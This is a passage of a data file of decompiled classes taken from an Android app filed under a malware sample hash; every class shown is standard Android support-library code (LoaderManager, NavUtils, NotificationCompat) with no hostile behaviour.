"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\LoaderManager.code","public abstract class LoaderManager { public interface LoaderCallbacks<D> {     Loader<D> onCreateLoader(    int i,    Bundle bundle);     void onLoadFinished(    Loader<D> loader,    D d);     void onLoaderReset(    Loader<D> loader);   }   public abstract void destroyLoader(  int i);   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract <D>Loader<D> getLoader(  int i);   public abstract <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public abstract <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public static void enableDebugLogging(  boolean enabled){     LoaderManagerImpl.DEBUG=enabled;   }   public boolean hasRunningLoaders(){     return false;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\LoaderManagerImpl.code","public class LoaderManagerImpl extends LoaderManager {   static boolean DEBUG=false;   static final String TAG=""LoaderManager"";   FragmentActivity mActivity;   boolean mCreatingLoader;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   final String mWho;   final SparseArrayCompat<LoaderInfo> mLoaders=new SparseArrayCompat<>();   final SparseArrayCompat<LoaderInfo> mInactiveLoaders=new SparseArrayCompat<>(); public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {     final Bundle mArgs;     LoaderManager.LoaderCallbacks<Object> mCallbacks;     Object mData;     boolean mDeliveredData;     boolean mDestroyed;     boolean mHaveData;     final int mId;     boolean mListenerRegistered;     Loader<Object> mLoader;     LoaderInfo mPendingLoader;     boolean mReportNextStart;     boolean mRetaining;     boolean mRetainingStarted;     boolean mStarted;     public LoaderInfo(    int id,    Bundle args,    LoaderManager.LoaderCallbacks<Object> callbacks){       this.mId=id;       this.mArgs=args;       this.mCallbacks=callbacks;     }     void start(){       if (this.mRetaining && this.mRetainingStarted) {         this.mStarted=true;         return;       }       if (!this.mStarted) {         this.mStarted=true;         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);         }         if (this.mLoader == null && this.mCallbacks != null) {           this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);         }         if (this.mLoader != null) {           if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);           }           if (!this.mListenerRegistered) {             this.mLoader.registerListener(this.mId,this);             this.mListenerRegistered=true;           }           this.mLoader.startLoading();         }       }     }     void retain(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);       }       this.mRetaining=true;       this.mRetainingStarted=this.mStarted;       this.mStarted=false;       this.mCallbacks=null;     }     void finishRetain(){       if (this.mRetaining) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);         }         this.mRetaining=false;         if (this.mStarted != this.mRetainingStarted && !this.mStarted) {           stop();         }       }       if (this.mStarted && this.mHaveData && !this.mReportNextStart) {         callOnLoadFinished(this.mLoader,this.mData);       }     }     void reportStart(){       if (this.mStarted && this.mReportNextStart) {         this.mReportNextStart=false;         if (this.mHaveData) {           callOnLoadFinished(this.mLoader,this.mData);         }       }     }     void stop(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);       }       this.mStarted=false;       if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);         this.mLoader.stopLoading();       }     }     void destroy(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);       }       this.mDestroyed=true;       boolean needReset=this.mDeliveredData;       this.mDeliveredData=false;       if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);         }         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";         }         try {           this.mCallbacks.onLoaderReset(this.mLoader);         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }       this.mCallbacks=null;       this.mData=null;       this.mHaveData=false;       if (this.mLoader != null) {         if (this.mListenerRegistered) {           this.mListenerRegistered=false;           this.mLoader.unregisterListener(this);         }         this.mLoader.reset();       }       if (this.mPendingLoader != null) {         this.mPendingLoader.destroy();       }     }     @Override public void onLoadComplete(    Loader<Object> loader,    Object data){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);       }       if (this.mDestroyed) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");           return;         }         return;       }       if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");           return;         }         return;       }       LoaderInfo pending=this.mPendingLoader;       if (pending != null) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);         }         this.mPendingLoader=null;         LoaderManagerImpl.this.mLoaders.put(this.mId,null);         destroy();         LoaderManagerImpl.this.installLoader(pending);         return;       }       if (this.mData != data || !this.mHaveData) {         this.mData=data;         this.mHaveData=true;         if (this.mStarted) {           callOnLoadFinished(loader,data);         }       }       LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);       if (info != null && info != this) {         info.mDeliveredData=false;         info.destroy();         LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);       }       if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {         LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();       }     }     void callOnLoadFinished(    Loader<Object> loader,    Object data){       if (this.mCallbacks != null) {         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";         }         try {           if (LoaderManagerImpl.DEBUG) {             Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));           }           this.mCallbacks.onLoadFinished(loader,data);           this.mDeliveredData=true;         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.mId);       sb.append("" : "");       DebugUtils.buildShortClassTag(this.mLoader,sb);       sb.append(""}}"");       return sb.toString();     }     public void dump(    String prefix,    FileDescriptor fd,    PrintWriter writer,    String[] args){       writer.print(prefix);       writer.print(""mId="");       writer.print(this.mId);       writer.print("" mArgs="");       writer.println(this.mArgs);       writer.print(prefix);       writer.print(""mCallbacks="");       writer.println(this.mCallbacks);       writer.print(prefix);       writer.print(""mLoader="");       writer.println(this.mLoader);       if (this.mLoader != null) {         this.mLoader.dump(prefix + ""  "",fd,writer,args);       }       if (this.mHaveData || this.mDeliveredData) {         writer.print(prefix);         writer.print(""mHaveData="");         writer.print(this.mHaveData);         writer.print(""  mDeliveredData="");         writer.println(this.mDeliveredData);         writer.print(prefix);         writer.print(""mData="");         writer.println(this.mData);       }       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mReportNextStart="");       writer.print(this.mReportNextStart);       writer.print("" mDestroyed="");       writer.println(this.mDestroyed);       writer.print(prefix);       writer.print(""mRetaining="");       writer.print(this.mRetaining);       writer.print("" mRetainingStarted="");       writer.print(this.mRetainingStarted);       writer.print("" mListenerRegistered="");       writer.println(this.mListenerRegistered);       if (this.mPendingLoader != null) {         writer.print(prefix);         writer.println(""Pending Loader "");         writer.print(this.mPendingLoader);         writer.println("":"");         this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);       }     }   }   public LoaderManagerImpl(  String who,  FragmentActivity activity,  boolean started){     this.mWho=who;     this.mActivity=activity;     this.mStarted=started;   }   public void updateActivity(  FragmentActivity activity){     this.mActivity=activity;   }   private LoaderInfo createLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     LoaderInfo info=new LoaderInfo(id,args,callback);     Loader<Object> loader=callback.onCreateLoader(id,args);     info.mLoader=loader;     return info;   }   private LoaderInfo createAndInstallLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     try {       this.mCreatingLoader=true;       LoaderInfo info=createLoader(id,args,callback);       installLoader(info);       return info;     }   finally {       this.mCreatingLoader=false;     }   }   void installLoader(  LoaderInfo info){     this.mLoaders.put(info.mId,info);     if (this.mStarted) {       info.start();     }   }   @Override public <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""initLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo == null) {       loaderInfo=createAndInstallLoader(i,bundle,loaderCallbacks);       if (DEBUG) {         Log.v(TAG,""  Created new loader "" + loaderInfo);       }     }  else {       if (DEBUG) {         Log.v(TAG,""  Re-using existing loader "" + loaderInfo);       }       loaderInfo.mCallbacks=loaderCallbacks;     }     if (loaderInfo.mHaveData && this.mStarted) {       loaderInfo.callOnLoadFinished(loaderInfo.mLoader,loaderInfo.mData);     }     return (Loader<D>)loaderInfo.mLoader;   }   @Override public <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""restartLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo != null) {       LoaderInfo loaderInfo2=this.mInactiveLoaders.get(i);       if (loaderInfo2 != null) {         if (loaderInfo.mHaveData) {           if (DEBUG) {             Log.v(TAG,""  Removing last inactive loader: "" + loaderInfo);           }           loaderInfo2.mDeliveredData=false;           loaderInfo2.destroy();           loaderInfo.mLoader.abandon();           this.mInactiveLoaders.put(i,loaderInfo);         }  else         if (!loaderInfo.mStarted) {           if (DEBUG) {             Log.v(TAG,""  Current loader is stopped; replacing"");           }           this.mLoaders.put(i,null);           loaderInfo.destroy();         }  else {           if (loaderInfo.mPendingLoader != null) {             if (DEBUG) {               Log.v(TAG,""  Removing pending loader: "" + loaderInfo.mPendingLoader);             }             loaderInfo.mPendingLoader.destroy();             loaderInfo.mPendingLoader=null;           }           if (DEBUG) {             Log.v(TAG,""  Enqueuing as new pending loader"");           }           loaderInfo.mPendingLoader=createLoader(i,bundle,loaderCallbacks);           return (Loader<D>)loaderInfo.mPendingLoader.mLoader;         }       }  else {         if (DEBUG) {           Log.v(TAG,""  Making last loader inactive: "" + loaderInfo);         }         loaderInfo.mLoader.abandon();         this.mInactiveLoaders.put(i,loaderInfo);       }     }     return (Loader<D>)createAndInstallLoader(i,bundle,loaderCallbacks).mLoader;   }   @Override public void destroyLoader(  int id){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     if (DEBUG) {       Log.v(TAG,""destroyLoader in "" + this + "" of ""+ id);     }     int idx=this.mLoaders.indexOfKey(id);     if (idx >= 0) {       LoaderInfo info=this.mLoaders.valueAt(idx);       this.mLoaders.removeAt(idx);       info.destroy();     }     int idx2=this.mInactiveLoaders.indexOfKey(id);     if (idx2 >= 0) {       LoaderInfo info2=this.mInactiveLoaders.valueAt(idx2);       this.mInactiveLoaders.removeAt(idx2);       info2.destroy();     }     if (this.mActivity != null && !hasRunningLoaders()) {       this.mActivity.mFragments.startPendingDeferredFragments();     }   }   @Override public <D>Loader<D> getLoader(  int i){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (loaderInfo != null) {       if (loaderInfo.mPendingLoader != null) {         return (Loader<D>)loaderInfo.mPendingLoader.mLoader;       }       return (Loader<D>)loaderInfo.mLoader;     }     return null;   }   public void doStart(){     if (DEBUG) {       Log.v(TAG,""Starting in "" + this);     }     if (this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,e);     }  else {       this.mStarted=true;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).start();       }     }   }   public void doStop(){     if (DEBUG) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,e);     }  else {       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).stop();       }       this.mStarted=false;     }   }   public void doRetain(){     if (DEBUG) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,e);     }  else {       this.mRetaining=true;       this.mStarted=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).retain();       }     }   }   public void finishRetain(){     if (this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.mRetaining=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).finishRetain();       }     }   }   public void doReportNextStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).mReportNextStart=true;     }   }   public void doReportStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).reportStart();     }   }   public void doDestroy(){     if (!this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).destroy();       }       this.mLoaders.clear();     }     if (DEBUG) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int i2=this.mInactiveLoaders.size() - 1; i2 >= 0; i2--) {       this.mInactiveLoaders.valueAt(i2).destroy();     }     this.mInactiveLoaders.clear();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     DebugUtils.buildShortClassTag(this.mActivity,sb);     sb.append(""}}"");     return sb.toString();   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     if (this.mLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Active Loaders:"");       String innerPrefix=prefix + ""    "";       for (int i=0; i < this.mLoaders.size(); i++) {         LoaderInfo li=this.mLoaders.valueAt(i);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mLoaders.keyAt(i));         writer.print("": "");         writer.println(li.toString());         li.dump(innerPrefix,fd,writer,args);       }     }     if (this.mInactiveLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Inactive Loaders:"");       String innerPrefix2=prefix + ""    "";       for (int i2=0; i2 < this.mInactiveLoaders.size(); i2++) {         LoaderInfo li2=this.mInactiveLoaders.valueAt(i2);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mInactiveLoaders.keyAt(i2));         writer.print("": "");         writer.println(li2.toString());         li2.dump(innerPrefix2,fd,writer,args);       }     }   }   @Override public boolean hasRunningLoaders(){     boolean loadersRunning=false;     int count=this.mLoaders.size();     for (int i=0; i < count; i++) {       LoaderInfo li=this.mLoaders.valueAt(i);       loadersRunning|=li.mStarted && !li.mDeliveredData;     }     return loadersRunning;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NavUtils.code","public class NavUtils {   private static final NavUtilsImpl IMPL;   public static final String PARENT_ACTIVITY=""android.support.PARENT_ACTIVITY"";   private static final String TAG=""NavUtils""; public interface NavUtilsImpl {     Intent getParentActivityIntent(    Activity activity);     String getParentActivityName(    Context context,    ActivityInfo activityInfo);     void navigateUpTo(    Activity activity,    Intent intent);     boolean shouldUpRecreateTask(    Activity activity,    Intent intent);   } public static class NavUtilsImplBase implements NavUtilsImpl {     NavUtilsImplBase(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent parentIntent=null;       String parentName=NavUtils.getParentActivityName(activity);       if (parentName != null) {         ComponentName target=new ComponentName(activity,parentName);         try {           String grandparent=NavUtils.getParentActivityName(activity,target);           parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);         }  catch (        PackageManager.NameNotFoundException e) {           Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");         }       }       return parentIntent;     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       String action=activity.getIntent().getAction();       return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       upIntent.addFlags(67108864);       activity.startActivity(upIntent);       activity.finish();     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String parentActivity;       if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {         if (parentActivity.charAt(0) == '.') {           return context.getPackageName() + parentActivity;         }         return parentActivity;       }       return null;     }   } static class NavUtilsImplJB extends NavUtilsImplBase {     NavUtilsImplJB(){     }     @Override public Intent getParentActivityIntent(    Activity activity){       Intent result=NavUtilsJB.getParentActivityIntent(activity);       if (result == null) {         return superGetParentActivityIntent(activity);       }       return result;     }     Intent superGetParentActivityIntent(    Activity activity){       return super.getParentActivityIntent(activity);     }     @Override public boolean shouldUpRecreateTask(    Activity activity,    Intent targetIntent){       return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);     }     @Override public void navigateUpTo(    Activity activity,    Intent upIntent){       NavUtilsJB.navigateUpTo(activity,upIntent);     }     @Override public String getParentActivityName(    Context context,    ActivityInfo info){       String result=NavUtilsJB.getParentActivityName(info);       if (result == null) {         return super.getParentActivityName(context,info);       }       return result;     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 16) {       IMPL=new NavUtilsImplJB();     }  else {       IMPL=new NavUtilsImplBase();     }   }   public static boolean shouldUpRecreateTask(  Activity sourceActivity,  Intent targetIntent){     return IMPL.shouldUpRecreateTask(sourceActivity,targetIntent);   }   public static void navigateUpFromSameTask(  Activity sourceActivity){     Intent upIntent=getParentActivityIntent(sourceActivity);     if (upIntent == null) {       throw new IllegalArgumentException(""Activity "" + sourceActivity.getClass().getSimpleName() + "" does not have a parent activity name specified. (Did you forget to add the android.support.PARENT_ACTIVITY <meta-data>  element in your manifest?)"");     }     navigateUpTo(sourceActivity,upIntent);   }   public static void navigateUpTo(  Activity sourceActivity,  Intent upIntent){     IMPL.navigateUpTo(sourceActivity,upIntent);   }   public static Intent getParentActivityIntent(  Activity sourceActivity){     return IMPL.getParentActivityIntent(sourceActivity);   }   public static Intent getParentActivityIntent(  Context context,  Class<?> sourceActivityClass) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,new ComponentName(context,sourceActivityClass));     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(context,parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static Intent getParentActivityIntent(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     String parentActivity=getParentActivityName(context,componentName);     if (parentActivity == null) {       return null;     }     ComponentName target=new ComponentName(componentName.getPackageName(),parentActivity);     String grandparent=getParentActivityName(context,target);     return grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);   }   public static String getParentActivityName(  Activity sourceActivity){     try {       return getParentActivityName(sourceActivity,sourceActivity.getComponentName());     }  catch (    PackageManager.NameNotFoundException e) {       throw new IllegalArgumentException(e);     }   }   public static String getParentActivityName(  Context context,  ComponentName componentName) throws PackageManager.NameNotFoundException {     PackageManager pm=context.getPackageManager();     ActivityInfo info=pm.getActivityInfo(componentName,128);     String parentActivity=IMPL.getParentActivityName(context,info);     return parentActivity;   }   private NavUtils(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NavUtilsImpl.code","public interface NavUtilsImpl {   Intent getParentActivityIntent(  Activity activity);   String getParentActivityName(  Context context,  ActivityInfo activityInfo);   void navigateUpTo(  Activity activity,  Intent intent);   boolean shouldUpRecreateTask(  Activity activity,  Intent intent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NavUtilsImplBase.code","public static class NavUtilsImplBase implements NavUtilsImpl {   NavUtilsImplBase(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent parentIntent=null;     String parentName=NavUtils.getParentActivityName(activity);     if (parentName != null) {       ComponentName target=new ComponentName(activity,parentName);       try {         String grandparent=NavUtils.getParentActivityName(activity,target);         parentIntent=grandparent == null ? IntentCompat.makeMainActivity(target) : new Intent().setComponent(target);       }  catch (      PackageManager.NameNotFoundException e) {         Log.e(NavUtils.TAG,""getParentActivityIntent: bad parentActivityName '"" + parentName + ""' in manifest"");       }     }     return parentIntent;   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     String action=activity.getIntent().getAction();     return (action == null || action.equals(""android.intent.action.MAIN"")) ? false : true;   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     upIntent.addFlags(67108864);     activity.startActivity(upIntent);     activity.finish();   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String parentActivity;     if (info.metaData != null && (parentActivity=info.metaData.getString(NavUtils.PARENT_ACTIVITY)) != null) {       if (parentActivity.charAt(0) == '.') {         return context.getPackageName() + parentActivity;       }       return parentActivity;     }     return null;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NavUtilsImplJB.code","static class NavUtilsImplJB extends NavUtilsImplBase {   NavUtilsImplJB(){   }   @Override public Intent getParentActivityIntent(  Activity activity){     Intent result=NavUtilsJB.getParentActivityIntent(activity);     if (result == null) {       return superGetParentActivityIntent(activity);     }     return result;   }   Intent superGetParentActivityIntent(  Activity activity){     return super.getParentActivityIntent(activity);   }   @Override public boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return NavUtilsJB.shouldUpRecreateTask(activity,targetIntent);   }   @Override public void navigateUpTo(  Activity activity,  Intent upIntent){     NavUtilsJB.navigateUpTo(activity,upIntent);   }   @Override public String getParentActivityName(  Context context,  ActivityInfo info){     String result=NavUtilsJB.getParentActivityName(info);     if (result == null) {       return super.getParentActivityName(context,info);     }     return result;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NavUtilsJB.code","class NavUtilsJB {   NavUtilsJB(){   }   public static Intent getParentActivityIntent(  Activity activity){     return activity.getParentActivityIntent();   }   public static boolean shouldUpRecreateTask(  Activity activity,  Intent targetIntent){     return activity.shouldUpRecreateTask(targetIntent);   }   public static void navigateUpTo(  Activity activity,  Intent upIntent){     activity.navigateUpTo(upIntent);   }   public static String getParentActivityName(  ActivityInfo info){     return info.parentActivityName;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NonConfigurationInstances.code","static final class NonConfigurationInstances {   Object activity;   SimpleArrayMap<String,Object> children;   Object custom;   ArrayList<Fragment> fragments;   SimpleArrayMap<String,LoaderManagerImpl> loaders;   NonConfigurationInstances(){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NoSaveStateFrameLayout.code","class NoSaveStateFrameLayout extends FrameLayout {   public static ViewGroup wrap(  View child){     NoSaveStateFrameLayout wrapper=new NoSaveStateFrameLayout(child.getContext());     ViewGroup.LayoutParams childParams=child.getLayoutParams();     if (childParams != null) {       wrapper.setLayoutParams(childParams);     }     FrameLayout.LayoutParams lp=new FrameLayout.LayoutParams(-1,-1);     child.setLayoutParams(lp);     wrapper.addView(child);     return wrapper;   }   public NoSaveStateFrameLayout(  Context context){     super(context);   }   @Override protected void dispatchSaveInstanceState(  SparseArray<Parcelable> container){     dispatchFreezeSelfOnly(container);   }   @Override protected void dispatchRestoreInstanceState(  SparseArray<Parcelable> container){     dispatchThawSelfOnly(container);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.app\NotificationCompat.code","public class NotificationCompat {   public static final int FLAG_HIGH_PRIORITY=128;   private static final NotificationCompatImpl IMPL;   public static final int PRIORITY_DEFAULT=0;   public static final int PRIORITY_HIGH=1;   public static final int PRIORITY_LOW=-1;   public static final int PRIORITY_MAX=2;   public static final int PRIORITY_MIN=-2; public interface NotificationCompatImpl {     Notification build(    Builder builder);   } static class NotificationCompatImplBase implements NotificationCompatImpl {     NotificationCompatImplBase(){     }     @Override public Notification build(    Builder b){       Notification result=b.mNotification;       result.setLatestEventInfo(b.mContext,b.mContentTitle,b.mContentText,b.mContentIntent);       if (b.mPriority > 0) {         result.flags|=128;       }       return result;     }   } static class NotificationCompatImplHoneycomb implements NotificationCompatImpl {     NotificationCompatImplHoneycomb(){     }     @Override public Notification build(    Builder b){       return NotificationCompatHoneycomb.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon);     }   } static class NotificationCompatImplIceCreamSandwich implements NotificationCompatImpl {     NotificationCompatImplIceCreamSandwich(){     }     @Override public Notification build(    Builder b){       return NotificationCompatIceCreamSandwich.add(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate);     }   } static class NotificationCompatImplJellybean implements NotificationCompatImpl {     NotificationCompatImplJellybean(){     }     @Override public Notification build(    Builder b){       NotificationCompatJellybean jbBuilder=new NotificationCompatJellybean(b.mContext,b.mNotification,b.mContentTitle,b.mContentText,b.mContentInfo,b.mTickerView,b.mNumber,b.mContentIntent,b.mFullScreenIntent,b.mLargeIcon,b.mProgressMax,b.mProgress,b.mProgressIndeterminate,b.mUseChronometer,b.mPriority,b.mSubText);       Iterator i$=b.mActions.iterator();       while (i$.hasNext()) {         Action action=i$.next();         jbBuilder.addAction(action.icon,action.title,action.actionIntent);       }       if (b.mStyle != null) {         if (b.mStyle instanceof BigTextStyle) {           BigTextStyle style=(BigTextStyle)b.mStyle;           jbBuilder.addBigTextStyle(style.mBigContentTitle,style.mSummaryTextSet,style.mSummaryText,style.mBigText);         }  else         if (b.mStyle instanceof InboxStyle) {           InboxStyle style2=(InboxStyle)b.mStyle;           jbBuilder.addInboxStyle(style2.mBigContentTitle,style2.mSummaryTextSet,style2.mSummaryText,style2.mTexts);         }  else         if (b.mStyle instanceof BigPictureStyle) {           BigPictureStyle style3=(BigPictureStyle)b.mStyle;           jbBuilder.addBigPictureStyle(style3.mBigContentTitle,style3.mSummaryTextSet,style3.mSummaryText,style3.mPicture,style3.mBigLargeIcon,style3.mBigLargeIconSet);         }       }       return jbBuilder.build();     }   } static {     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new NotificationCompatImplJellybean();       return;     }     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new NotificationCompatImplIceCreamSandwich();     }  else     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new NotificationCompatImplHoneycomb();     }  else {       IMPL=new NotificationCompatImplBase();     }   } public static class Builder {     CharSequence mContentInfo;     PendingIntent mContentIntent;     CharSequence mContentText;     CharSequence mContentTitle;     Context mContext;     PendingIntent mFullScreenIntent;     Bitmap mLargeIcon;     int mNumber;     int mPriority;     int mProgress;     boolean mProgressIndeterminate;     int mProgressMax;     Style mStyle;     CharSequence mSubText;     RemoteViews mTickerView;     boolean mUseChronometer;     ArrayList<Action> mActions=new ArrayList<>();     Notification mNotification=new Notification();     public Builder(    Context context){       this.mContext=context;       this.mNotification.when=System.currentTimeMillis();       this.mNotification.audioStreamType=-1;       this.mPriority=0;     }     public Builder setWhen(    long when){       this.mNotification.when=when;       return this;     }     public Builder setUsesChronometer(    boolean b){       this.mUseChronometer=b;       return this;     }     public Builder setSmallIcon(    int icon){       this.mNotification.icon=icon;       return 